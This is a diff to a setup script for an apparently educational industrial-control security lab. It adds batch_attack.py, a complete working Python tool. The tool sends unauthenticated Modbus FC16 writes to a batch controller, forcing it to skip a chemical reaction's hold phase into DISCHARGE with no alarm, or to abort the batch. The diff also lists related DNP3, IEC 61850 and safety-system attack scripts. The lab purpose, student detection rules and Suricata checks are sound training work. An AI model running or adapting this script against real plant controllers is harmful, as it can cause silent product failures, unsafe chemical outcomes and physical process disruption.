@@ -1081,6 +1081,199 @@ PYEOF
 
 chmod +x /root/Desktop/Attack_Scripts/sis_attack.py
 
+# ── batch_attack.py ────────────────────────────────────────────────────────────
+# ISA-88 Batch Tutorial: unauthorized Modbus write directly to a batch-controller's
+# current_phase/batch_state holding registers. buildBatchProgram()
+# (packages/orchestrator/src/plc-program-gen.ts) generates these as located %QW
+# outputs with no self-overriding logic — nothing in the ST rejects an externally
+# written phase value, so an attacker who can reach Modbus TCP can force the
+# recipe to skip straight to DISCHARGE regardless of the real REACT hold timer
+# or the reactor's real temperature. Unlike the SIS/DCS attacks elsewhere in this
+# project (which stop or disable a process — a visible denial of service), this
+# is a data-integrity/quality attack: the batch completes "successfully" from the
+# PLC's own state machine's point of view, with no alarm, while the chemical
+# reaction never actually finished. Uses FC16 (Write Multiple Registers) rather
+# than FC06 specifically because the pre-loaded ics-rules.rules already has a
+# generic FC16 baseline (SID 9000001/9000030) — the same "baseline rule already
+# fires, then the student authors a host-scoped rule" structure sis_attack.py's
+# Lab 04 uses with FC05/SID 9000002.
+cat > /root/Desktop/Attack_Scripts/batch_attack.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+batch_attack.py — Unauthorized Modbus register write against an ISA-88 batch
+controller, forcing a premature phase transition. ISA-88 Batch Tutorial.
+
+Writes Modbus Function Code 16 (Write Multiple Registers) to the batch
+controller's current_phase register (holding register 1 by default) — the
+same located %QW1 output buildBatchProgram()'s phase-sequencer ST reads and
+writes every scan, but from an unauthorized source. Modbus has no built-in
+authentication: any host that can reach TCP port 502 can issue this command.
+
+Default attack: write current_phase=5 (DISCHARGE) while the batch is mid-REACT.
+The reactor's discharge valve opens and the vessel actually drains via real
+physics — this is a genuine physical consequence, not a cosmetic state flip —
+but the reaction hold timer was skipped entirely. No alarm fires: the batch
+still reaches COMPLETE, exactly as if it had finished normally.
+
+Bonus/challenge variant: --register 0 --value 3 writes batch_state=ABORTED
+directly, forcing an immediate stop from any phase (a denial-of-service
+variant, contrasted with the default quality-integrity attack above).
+
+Usage:
+    python3 batch_attack.py <batch-controller-ip> [--port 502] [--register 1] [--value 5]
+
+Examples:
+    python3 batch_attack.py 10.200.10.15                    # force-skip to DISCHARGE
+    python3 batch_attack.py 10.200.10.15 --register 0 --value 3   # force ABORT (bonus)
+"""
+
+import argparse
+import os
+import socket
+import struct
+import sys
+
+
+def build_write_multiple_registers(transaction_id, unit_id, start_address, values):
+    """
+    Builds a Modbus/TCP Write Multiple Registers (FC 0x10) request.
+
+    MBAP header: TransactionID(2) + ProtocolID(2)=0 + Length(2) + UnitID(1)
+    PDU: FunctionCode(1)=0x10 + StartAddress(2) + Quantity(2) + ByteCount(1)
+         + Values(2 bytes each)
+    """
+    quantity = len(values)
+    byte_count = quantity * 2
+    pdu = struct.pack(">BHHB", 0x10, start_address, quantity, byte_count)
+    for v in values:
+        pdu += struct.pack(">H", v)
+    length = 1 + len(pdu)  # unit id + PDU
+    mbap = struct.pack(">HHHB", transaction_id, 0x0000, length, unit_id)
+    return mbap + pdu
+
+
+PHASE_NAMES = {0: "NONE", 1: "CHARGE", 2: "HEAT", 3: "REACT", 4: "COOL", 5: "DISCHARGE"}
+STATE_NAMES = {0: "IDLE", 1: "RUNNING", 2: "HELD", 3: "ABORTED", 4: "COMPLETE"}
+
+
+def run_attack(host, port, unit_id, register, value, timeout):
+    is_phase_write = register == 1
+    label = PHASE_NAMES.get(value, str(value)) if is_phase_write else STATE_NAMES.get(value, str(value))
+    reg_name = "current_phase (HR1)" if is_phase_write else "batch_state (HR0)" if register == 0 else f"HR{register}"
+
+    print(f"[batch-attack] Target:  {host}:{port}  (Modbus TCP, unit id {unit_id})")
+    print(f"[batch-attack] Command: Write Multiple Registers (FC 0x10) -> {reg_name} -> {value} ({label})")
+    print()
+    print("[batch-attack] NOTE: Modbus requires no credentials — any host that can reach")
+    print("[batch-attack] TCP port 502 on this batch controller can issue this command.")
+    if is_phase_write:
+        print("[batch-attack] Forcing current_phase directly skips the recipe's REACT hold")
+        print("[batch-attack] timer entirely. Nothing in the generated ST rejects an unexpected")
+        print("[batch-attack] phase value — the batch will discharge and reach COMPLETE with")
+        print("[batch-attack] no alarm, even though the reaction never actually finished.")
+    print()
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    try:
+        sock.connect((host, port))
+    except ConnectionRefusedError:
+        print(f"[batch-attack] ERROR: Connection refused — {host}:{port} is not reachable.")
+        print("[batch-attack] If an IPS reject rule or firewall block is active, this is expected!")
+        sys.exit(2)
+    except socket.timeout:
+        print(f"[batch-attack] ERROR: Connection timed out after {timeout}s.")
+        sys.exit(1)
+    except OSError as exc:
+        print(f"[batch-attack] ERROR: {exc}")
+        sys.exit(1)
+
+    print(f"[batch-attack] TCP connection established to {host}:{port}")
+
+    frame = build_write_multiple_registers(transaction_id=1, unit_id=unit_id,
+                                            start_address=register, values=[value])
+    print(f"[batch-attack] Sending Write Multiple Registers frame ({len(frame)} bytes):")
+    print(f"[batch-attack]   Function code:   0x10  (Write Multiple Registers)")
+    print(f"[batch-attack]   Start register:  {register}")
+    print(f"[batch-attack]   Value:           {value} ({label})")
+    print(f"[batch-attack]   Full frame hex:  {frame.hex(' ')}")
+    print()
+    sock.sendall(frame)
+    print("[batch-attack] Write request transmitted — waiting for response ...")
+
+    try:
+        response = sock.recv(12)
+        if response:
+            print(f"[batch-attack] Response received: {response.hex(' ')}")
+        else:
+            print("[batch-attack] Server closed connection without responding.")
+    except socket.timeout:
+        print(f"[batch-attack] No response within {timeout}s.")
+        print("[batch-attack] The packet was still delivered — Suricata should have seen it.")
+    except ConnectionResetError:
+        print("[batch-attack] Connection reset by peer while waiting for a response.")
+        print("[batch-attack] If an IPS reject rule is active, this is the expected result —")
+        print("[batch-attack] the write was likely blocked before the controller could act on it.")
+        sock.close()
+        sys.exit(2)
+
+    sock.close()
+
+    print()
+    print("[batch-attack] ═══════════════════════════════════════════════════════════")
+    print("[batch-attack]  ATTACK COMPLETE")
+    print(f"[batch-attack]  {reg_name} on {host} -> {value} ({label})")
+    print("[batch-attack]  Now check: OpenPLC Monitoring -> current_phase/batch_state")
+    print("[batch-attack]             OTForge Monitor -> Suricata tab for SID 9000001/9000030")
+    print("[batch-attack] ═══════════════════════════════════════════════════════════")
+
+
+def main():
+    # NOTE: intentionally NOT 10.200.10.10/.11 — those are the plc_init
+    # background poller's PLC_IP default (this script's docstring explains
+    # why) and the RTU_IP/SIS_IP defaults respectively. A batch-controller
+    # placed at either address would get its start_cmd/hold_cmd coils and
+    # batch_state register silently overwritten by plc_init.py's Lab01-
+    # specific baseline seed on container boot before a student ever
+    # touches anything. Found live-verifying this tutorial.
+    default_ip = os.getenv("BATCH_IP", "10.200.10.15")
+    parser = argparse.ArgumentParser(
+        description="Modbus batch-controller phase/state register write attack — ISA-88 Batch Tutorial"
+    )
+    parser.add_argument(
+        "target", nargs="?", default=default_ip,
+        help=f"IP of target batch controller (default: {default_ip})"
+    )
+    parser.add_argument("--port", type=int, default=502, help="TCP port (default 502)")
+    parser.add_argument("--unit", type=int, default=1, help="Modbus unit id (default 1)")
+    parser.add_argument(
+        "--register", type=int, default=1,
+        help="Holding register to write — 1 = current_phase (default), 0 = batch_state"
+    )
+    parser.add_argument(
+        "--value", type=int, default=5,
+        help="Value to write — default 5 (force current_phase=DISCHARGE). "
+             "Use --register 0 --value 3 to force batch_state=ABORTED instead."
+    )
+    parser.add_argument("--timeout", type=float, default=5.0, help="Socket timeout in seconds (default 5)")
+    args = parser.parse_args()
+
+    run_attack(
+        host=args.target,
+        port=args.port,
+        unit_id=args.unit,
+        register=args.register,
+        value=args.value,
+        timeout=args.timeout,
+    )
+
+
+if __name__ == "__main__":
+    main()
+PYEOF
+
+chmod +x /root/Desktop/Attack_Scripts/batch_attack.py
+
 echo "[otforge-attack] Attack_Scripts created:"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py      — read coil + register state (one-shot)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py      — coil write attack (--restore to undo)"
@@ -1089,6 +1282,7 @@ echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py   — liv
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/dnp3_attack.py     — DNP3 Direct Operate attack (Lab 03)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/iec61850_attack.py — IEC 61850 MMS breaker control attack (IEC 61850 Tutorial)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/sis_attack.py       — Modbus SIS trip-relay coil write attack (Lab 04, TRITON/TRISIS)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/batch_attack.py     — Modbus batch-controller phase/state register write attack (ISA-88 Batch Tutorial)"
 
 # ── PLC Modbus baseline initialization ────────────────────────────────────────
 # Runs in the background so VNC/noVNC startup is not delayed.
